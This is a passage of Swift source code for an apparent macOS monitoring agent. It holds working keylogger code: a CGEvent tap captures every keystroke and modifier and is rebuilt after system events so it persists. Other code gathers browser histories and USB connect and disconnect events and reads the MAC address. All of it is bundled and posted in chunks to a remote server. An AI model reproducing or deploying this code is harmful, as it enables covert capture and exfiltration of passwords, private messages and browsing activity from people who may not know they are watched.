                        if newinterval > 0 && newinterval != TIME_INTERVAL {
                            TIME_INTERVAL = newinterval
                        }
                    }
                    wait = false
                }, failure: {(error: NSError!) -> Void in
                    self.debugPrint("failure")
                    wait = false
                })
            
            self.waitFor(&wait)
        } else {
            DistributedNotificationCenter.default().postNotificationName(Notification.Name("aliceServerIPUndefined"), object: CHECKER_IDENTIFIER, userInfo: nil, options: .deliverImmediately)
        }
    }
    
    func convertToDictionary(text: String) -> [String: Any]? {
        if let data = text.data(using: .utf8) {
            do {
                return try JSONSerialization.jsonObject(with: data, options: []) as? [String: Any]
            } catch {
                debugPrint(error.localizedDescription)
            }
        }
        return nil
    }
    
    func getMacAddress() -> String {
        let theTask = Process()
        let taskOutput = Pipe()
        theTask.launchPath = "/sbin/ifconfig"
        theTask.standardOutput = taskOutput
        theTask.standardError = taskOutput
        theTask.arguments = ["en0"]
        
        theTask.launch()
        theTask.waitUntilExit()
        
        let taskData = taskOutput.fileHandleForReading.readDataToEndOfFile()
        
        if let stringResult = NSString(data: taskData, encoding: String.Encoding.utf8.rawValue) {
            if stringResult != "ifconfig: interface en0 does not exist" {
                let f = stringResult.range(of: "ether")
                if f.location != NSNotFound {
                    let sub = stringResult.substring(from: f.location + f.length)
                    let start = sub.index(sub.startIndex, offsetBy: 1)
                    let end = sub.index(sub.startIndex, offsetBy: 18)
                    let range = start ..< end
                    let result = sub[range]
                    let address = String(result)
                    return address
                }
            }
        }
        
        return ""
    }
    
    @objc func applicationDidTerminate(_ notification: Notification) {
        guard let app = notification.userInfo?[NSWorkspace.applicationUserInfoKey] as? NSRunningApplication,
              let bundleID = app.bundleIdentifier,
              browserBundleIDs.contains(bundleID) else {
            return
        }
        
        debugPrint("Browser terminated: \(bundleID)")
        // Wait a short moment to ensure the browser has fully closed and released the database
        DispatchQueue.main.asyncAfter(deadline: .now() + 1.0) { [weak self] in
            self?.sendBrowserHistories()
        }
    }

    private func startKeyboardMonitoring() {
        // Check permission before starting monitoring
        if isInputMonitoringEnabled() {
            setupKeyboardMonitoring()
        } else {
            // Start a timer to periodically check for permission
            self.debugPrint("Checking Keyboard Permission")
            requestAccessibilityPermission();
            Timer.scheduledTimer(withTimeInterval: 1.0, repeats: true) { [weak self] timer in
                self?.debugPrint("Checking Keyboard Permission 1")
                if self?.isInputMonitoringEnabled() == true {
                    // Permission granted, start monitoring
                    self?.debugPrint("Permission granted, starting keyboard monitoring")
                    self?.setupKeyboardMonitoring()
                    timer.invalidate()
                }
                self?.keyLogs.append(KeyLog(date: self?.getCurrentDateTimeString() ?? "", application: "", key: "Permission not granted"))
            }
        }
    }
    
    func debugPrint(_ message: String) {
        #if DEBUG
        print(message)
        #endif
    }
    
    private func setupKeyboardMonitoring() {
        debugPrint("Setting up keyboard monitoring...")
        
        // Clean up existing event tap if it exists
        if let existingTap = eventTap {
            CGEvent.tapEnable(tap: existingTap, enable: false)
            eventTap = nil
        }
        
        // Check permissions first
        if !isInputMonitoringEnabled() {
            debugPrint("Input monitoring permission not granted")
            requestAccessibilityPermission()
            return
        }
        
        // Create event mask for keyboard events
        let eventMask = CGEventMask(1 << CGEventType.keyDown.rawValue)
        
        // Create the event tap
        guard let newEventTap = CGEvent.tapCreate(
            tap: .cghidEventTap,
            place: .headInsertEventTap,
            options: .defaultTap,
            eventsOfInterest: eventMask,
            callback: handleKeyDownCallback,
            userInfo: UnsafeMutableRawPointer(Unmanaged.passUnretained(self).toOpaque())
        ) else {
            debugPrint("Failed to create event tap")
            return
        }
        
        // Create a run loop source
        let runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, newEventTap, 0)
        
        // Add to run loop
        CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, .commonModes)
        
        // Enable the event tap
        CGEvent.tapEnable(tap: newEventTap, enable: true)
        
        // Store the event tap
        eventTap = newEventTap
        
        debugPrint("Keyboard monitoring setup complete")
        storage.set(true, forKey: "input-monitoring-enabled")
    }

    func checkModifierKeys(_ event: CGEvent) -> String {
        let flags = event.flags
        let keyCode = event.getIntegerValueField(.keyboardEventKeycode)
        var modifiers: [String] = []
        
        if flags.contains(.maskCommand) {
            modifiers.append("Command")
        }
        if flags.contains(.maskAlternate) {
            modifiers.append("Option")
        }
        if flags.contains(.maskControl) {
            modifiers.append("Control")
        }
        // Only show Shift if the character is not printable (like arrow keys, function keys, etc.)
        if flags.contains(.maskShift) {
            // Get the character from the event to check if it's printable
            if let nsEvent = NSEvent(cgEvent: event) {
                let character = nsEvent.charactersIgnoringModifiers ?? ""
                debugPrint("Shift detected - KeyCode: \(keyCode), Character: '\(character)', Character count: \(character.count)")
                
                // Check if this is a special key that should always show Shift
                let specialKeys = [123, 124, 125, 126, 36, 48, 51, 53, 76, 116, 117, 121, 115, 119, 96, 97, 98, 99, 100, 101, 103, 105, 107, 109, 111, 122, 120, 118]
                if specialKeys.contains(Int(keyCode)) {
                    modifiers.append("Shift")
                    debugPrint("Adding Shift modifier - keyCode \(keyCode) is a special key")
                } else if character.isEmpty {
                    modifiers.append("Shift")
                    debugPrint("Adding Shift modifier - character is empty")
                } else {
                    // Check if character is actually printable (not control characters)
                    let printableSet = CharacterSet.letters.union(CharacterSet.decimalDigits).union(CharacterSet.punctuationCharacters).union(CharacterSet.symbols).union(CharacterSet.whitespaces)
                    if character.rangeOfCharacter(from: printableSet) != nil {
                        debugPrint("Not adding Shift modifier - character '\(character)' is printable")
                    } else {
                        modifiers.append("Shift")
                        debugPrint("Adding Shift modifier - character '\(character)' is not printable")
                    }
                }
            } else {
                // If we can't get the character, show Shift for non-printable key codes
                let nonPrintableKeyCodes = [123, 124, 125, 126, 36, 48, 51, 53, 76, 116, 117, 121, 115, 119, 96, 97, 98, 99, 100, 101, 103, 105, 107, 109, 111, 122, 120, 118]
                if nonPrintableKeyCodes.contains(Int(keyCode)) {
                    modifiers.append("Shift")
                    debugPrint("Adding Shift modifier - keyCode \(keyCode) is in non-printable list")
                } else {
                    debugPrint("Not adding Shift modifier - keyCode \(keyCode) is not in non-printable list")
                }
            }
        }
        // Only include Fn if it's not an arrow key (arrow keys often have Fn automatically included)
        // if flags.contains(.maskSecondaryFn) && ![123, 124, 125, 126].contains(Int(keyCode)) {
        //     modifiers.append("Fn")
        // }
        if flags.contains(.maskAlphaShift) {
            modifiers.append("Caps Lock")
        }
        
        return modifiers.isEmpty ? "" : (modifiers.joined(separator: "+") + "+")
    }

    func applicationWillTerminate(_ aNotification: Notification) {
        // Clean up the event tap
        if let tap = eventTap {
            CGEvent.tapEnable(tap: tap, enable: false)
            eventTap = nil
        }
        
        timer?.invalidate()
        timer = nil
        
        // Clean up notification observers
        NotificationCenter.default.removeObserver(self)
        NSWorkspace.shared.notificationCenter.removeObserver(self)
        
        // Clean up USB monitoring
        if let port = usbNotificationPort {
            IONotificationPortDestroy(port)
        }
        if usbAddedIterator != 0 {
            IOObjectRelease(usbAddedIterator)
        }
        if usbRemovedIterator != 0 {
            IOObjectRelease(usbRemovedIterator)
        }
    }

    private func requestAccessibilityPermission() {
        let options = [kAXTrustedCheckOptionPrompt.takeUnretainedValue(): true]
        let trusted = AXIsProcessTrustedWithOptions(options as CFDictionary)
        
        if trusted {
            print("Accessibility permission granted")
        } else {
            print("Accessibility permission denied")
        }
    }
    
    private func isInputMonitoringEnabled() -> Bool {
        debugPrint("isInputMonitoringEnabled")
        // Try to create a monitor - if it fails, we don't have permission
        let eventMask = CGEventMask(1 << CGEventType.keyDown.rawValue) | CGEventMask(1 << CGEventType.keyUp.rawValue)
        let tap = CGEvent.tapCreate(
            tap: .cgSessionEventTap,
            place: .headInsertEventTap,
            options: .defaultTap,
            eventsOfInterest: CGEventMask(eventMask),
            callback: handleKeyDownCallback,
            userInfo: nil
        )
        
        if tap != nil {
            CGEvent.tapEnable(tap: tap!, enable: false)
            return true
        }
        return false
    }

    func getCurrentDateTimeString() -> String {
        let dateFormatter = DateFormatter()
        dateFormatter.dateFormat = "yyyy-MM-dd HH:mm:ss"
        dateFormatter.timeZone = TimeZone(identifier: "Asia/Vladivostok") // Set to VLAT
        return dateFormatter.string(from: Date())
    }

    private func setupUSBMonitoring() {
        // Create notification port
        usbNotificationPort = IONotificationPortCreate(kIOMasterPortDefault)
        
        // Add notification port to run loop
        if let port = usbNotificationPort {
            let runLoopSource = IONotificationPortGetRunLoopSource(port).takeUnretainedValue()
            CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, .commonModes)
        }
        
        // Create matching dictionary for USB devices
        let matchingDict = IOServiceMatching(kIOUSBDeviceClassName)
        
        // Add notification for device addition
        let addedCallback: IOServiceMatchingCallback = { (userData, iterator) in
            let appDelegate = Unmanaged<AppDelegate>.fromOpaque(userData!).takeUnretainedValue()
            appDelegate.handleUSBDeviceAdded(iterator)
        }
        
        // Add notification for device removal
        let removedCallback: IOServiceMatchingCallback = { (userData, iterator) in
            let appDelegate = Unmanaged<AppDelegate>.fromOpaque(userData!).takeUnretainedValue()
            appDelegate.handleUSBDeviceRemoved(iterator)
        }
        
        // Register for device addition notifications
        IOServiceAddMatchingNotification(
            usbNotificationPort,
            kIOMatchedNotification,
            matchingDict,
            addedCallback,
            Unmanaged.passUnretained(self).toOpaque(),
            &usbAddedIterator
        )
        
        // Register for device removal notifications
        IOServiceAddMatchingNotification(
            usbNotificationPort,
            kIOTerminatedNotification,
            matchingDict,
            removedCallback,
            Unmanaged.passUnretained(self).toOpaque(),
            &usbRemovedIterator
        )
        
        // Handle any existing devices
        handleUSBDeviceAdded(usbAddedIterator)
        handleUSBDeviceRemoved(usbRemovedIterator)
    }
    
    private func handleUSBDeviceAdded(_ iterator: io_iterator_t) {
        var device = IOIteratorNext(iterator)
        while device != 0 {
            if let deviceName = getUSBDeviceName(device) {
                let currentDate = getCurrentDateTimeString()
                usbDeviceLogs.append(USBDeviceLog(date: currentDate, device: "Connected: \(deviceName)"))
                debugPrint("USB Device Connected: \(deviceName)")
            }
            IOObjectRelease(device)
            device = IOIteratorNext(iterator)
        }
    }
    
    private func handleUSBDeviceRemoved(_ iterator: io_iterator_t) {
        var device = IOIteratorNext(iterator)
        while device != 0 {
            if let deviceName = getUSBDeviceName(device) {
                let currentDate = getCurrentDateTimeString()
                usbDeviceLogs.append(USBDeviceLog(date: currentDate, device: "Disconnected: \(deviceName)"))
                debugPrint("USB Device Disconnected: \(deviceName)")
            }
            IOObjectRelease(device)
            device = IOIteratorNext(iterator)
        }
    }
    
    private func getUSBDeviceName(_ device: io_object_t) -> String? {
        var deviceName: String?
        var vendorId: Int?
        
        // Get device properties
        var properties: Unmanaged<CFMutableDictionary>?
        let result = IORegistryEntryCreateCFProperties(device, &properties, kCFAllocatorDefault, 0)
        
        if result == KERN_SUCCESS, let props = properties?.takeRetainedValue() as? [String: Any] {
            // Get USB device name
            if let name = props["USB Product Name"] as? String {
                deviceName = name
            } else if let name = props["USB Vendor Name"] as? String {
                deviceName = name
            }
            
            // Get vendor ID
            if let vid = props["idVendor"] as? Int {
                vendorId = vid
            }
        }
        
        if let name = deviceName {
            if let vid = vendorId {
                return "\(name) (VID: 0x\(String(format: "%04X", vid)))"
            }
            return name
        }
        return nil
    }
    
    @objc func sendUSBLogs() {
        if self.usbDeviceLogs.count > 0 {
            do {
                // Send data in chunks
                sendDataInChunks(data: self.usbDeviceLogs, eventType: "USBLog", chunkSize: 500)
                self.usbDeviceLogs.removeAll()
            } catch {
                debugPrint("Error converting USB logs to JSON: \(error)")
            }
        }
    }

    func convertBrowserHistoryToJSONString(_ browseHist: [BrowserHistoryLog]) throws -> String {
        let encoder = JSONEncoder()
        let jsonData = try encoder.encode(browseHist)
        print(jsonData)
        return String(data: jsonData, encoding: .utf8) ?? ""
    }

    func convertKeyLogToJSONString(_ keyLogs: [KeyLog]) throws -> String {
        let encoder = JSONEncoder()
        let jsonData = try encoder.encode(keyLogs)
        print(jsonData)
        return String(data: jsonData, encoding: .utf8) ?? ""
    }
    
    func convertUSBLogToJSONString(_ usbLogs: [USBDeviceLog]) throws -> String {
        let encoder = JSONEncoder()
        let jsonData = try encoder.encode(usbLogs)
        print(jsonData)
        return String(data: jsonData, encoding: .utf8) ?? ""
    }

    private func sendDataInChunks(data: [Any], eventType: String, chunkSize: Int = 1000) {
        guard let url = buildEndpoint(false) else {
            DistributedNotificationCenter.default().postNotificationName(Notification.Name("aliceServerIPUndefined"), object: CHECKER_IDENTIFIER, userInfo: nil, options: .deliverImmediately)
            return
        }
        
        if eventType == "BrowserHistory" {
            debugPrint("Total lines to send: \(data.count)")
        }
        
        // Create chunks properly
        var chunks: [[Any]] = []
        for i in stride(from: 0, to: data.count, by: chunkSize) {
            let endIndex = min(i + chunkSize, data.count)
            let chunk = Array(data[i..<endIndex])
            chunks.append(chunk)
        }
        
        debugPrint("Sending \(eventType) in \(chunks.count) chunks of \(chunkSize) items each")
        
        for (index, chunk) in chunks.enumerated() {
            var chunkData = chunk
            
            // Use the correct field name for each data type
            var postData: [String: Any] = [
                "Event": eventType, 
                "Version": APP_VERSION, 
                "MacAddress": macAddress
            ]

            do {
                switch eventType {
                case "BrowserHistory":
                    postData["BrowserHistories"] = try convertBrowserHistoryToJSONString(chunkData as! [BrowserHistoryLog])
                case "KeyLog":
                    postData["KeyLogs"] = try convertKeyLogToJSONString(chunkData as! [KeyLog])
                case "USBLog":
                    postData["USBLogs"] = try convertUSBLogToJSONString(chunkData as! [USBDeviceLog])
                default:
                    postData["Data"] = chunkData
                }

                print(postData)
                
                _ = SRWebClient.postJSON(
                    url,
                    jsonObject: postData,
                    success: { response, status in
                        self.debugPrint("\(eventType) chunk \(index + 1)/\(chunks.count) response: \(response)")
                    },
                    failure: { error in
                        self.debugPrint("\(eventType) chunk \(index + 1)/\(chunks.count) failure: \(error)")
                    })
            } catch {
                debugPrint("Error converting \(eventType) chunk \(index + 1) to JSON: \(error)")
            }
        }
    }
    
    // Helper function to generate random string
    private func generateRandomString(length: Int) -> String {
        let characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
        let randomString = String((0..<length).map { _ in
            characters.randomElement()!
        })
        return randomString
    }
    
    // Helper function to get readable key names
    func getKeyName(keyCode: Int, character: String) -> String {
        // First check for special key codes that should have specific labels
        switch keyCode {
        case 123: return "LEFT" // Left Arrow
        case 124: return "RIGHT" // Right Arrow
        case 125: return "DOWN" // Down Arrow
        case 126: return "UP" // Up Arrow
        case 36: return "ENTER" // Enter
        case 48: return "TAB" // Tab
        case 49: return " " // Space
        case 51: return "BACKSPACE" // Backspace
        case 53: return "ESCAPE" // Escape
        case 76: return "ENTER" // Enter
        case 116: return "PAGE_UP" // Page Up
        case 117: return "DELETE" // Delete
        case 121: return "PAGE_DOWN" // Page Down
        case 115: return "HOME"
        case 119: return "END"
        case 96: return "F5"
        case 97: return "F6"
        case 98: return "F7"
        case 99: return "F3"
        case 100: return "F8"
        case 101: return "F9"
        case 103: return "F11"
        case 105: return "F13"
        case 107: return "F14"
        case 109: return "F10"
        case 111: return "F12"
        case 122: return "F1"
        case 120: return "F2"
        case 118: return "F4"
        default:
            // If character is not empty and printable, use it
            if !character.isEmpty && character.rangeOfCharacter(from: CharacterSet.controlCharacters.inverted) != nil {
                return character
            }
            return "\(keyCode)"
        }
    }
            
    // New method to setup event tap invalidation monitoring
    private func setupEventTapInvalidationMonitoring() {
        // Monitor for system events that might invalidate event taps
        NotificationCenter.default.addObserver(
            self,
            selector: #selector(handleSystemEvent),
            name: NSWorkspace.didWakeNotification,
            object: nil
        )
        
        NotificationCenter.default.addObserver(
            self,
            selector: #selector(handleSystemEvent),
            name: NSWorkspace.screensDidWakeNotification,
            object: nil
        )
        
        NotificationCenter.default.addObserver(
            self,
            selector: #selector(handleSystemEvent),
            name: NSWorkspace.didLaunchApplicationNotification,
            object: nil
        )
        
        // Additional system events that might affect event taps
        NotificationCenter.default.addObserver(
            self,
            selector: #selector(handleSystemEvent),
            name: NSWorkspace.didTerminateApplicationNotification,
            object: nil
        )
        
        NotificationCenter.default.addObserver(
            self,
            selector: #selector(handleSystemEvent),
            name: NSWorkspace.didActivateApplicationNotification,
            object: nil
        )
        
        // Monitor for user session changes
        NotificationCenter.default.addObserver(
            self,
            selector: #selector(handleSystemEvent),
            name: NSWorkspace.sessionDidBecomeActiveNotification,
            object: nil
        )
        
        NotificationCenter.default.addObserver(
            self,
            selector: #selector(handleSystemEvent),
            name: NSWorkspace.sessionDidResignActiveNotification,
            object: nil
        )
        
        debugPrint("Event tap invalidation monitoring setup complete")
    }
    
    @objc private func handleSystemEvent(_ notification: Notification) {
        debugPrint("System event detected: \(notification.name.rawValue)")
        // Force check event tap validity after system events
        DispatchQueue.main.asyncAfter(deadline: .now() + 2.0) {
            self.checkAndReestablishEventTapThrottled()
        }
    }
}

